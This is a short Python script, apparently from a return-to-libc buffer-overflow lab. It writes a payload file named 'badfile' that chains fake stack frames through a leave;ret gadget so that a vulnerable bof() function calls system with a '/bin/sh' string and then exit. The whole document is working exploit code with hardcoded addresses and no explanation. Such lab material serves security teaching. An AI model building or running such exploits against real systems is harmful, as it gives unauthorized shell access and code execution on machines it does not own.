#!/usr/bin/python3 

import sys 

start = 112
bin_sh_addr = 0xffffdf7f
ebp_value = 0xffffd118
system_addr = 0xf7e13420 
exit_addr = 0xf7e05f80 
leaveret =  0x565562ce 

content = bytearray(0xaa for i in range(1000))

# bof() to leaveret 
ebp_value += 8    
content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
start += 4 

# system
ebp_value += 16 
content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
start += 4 
content[start:start+4] = (system_addr).to_bytes(4, byteorder='little') 
start += 4 
content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (bin_sh_addr).to_bytes(4, byteorder='little') 
start += 4

# exit 
content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little') 

with open("badfile", "wb") as f:
    f.write(content)
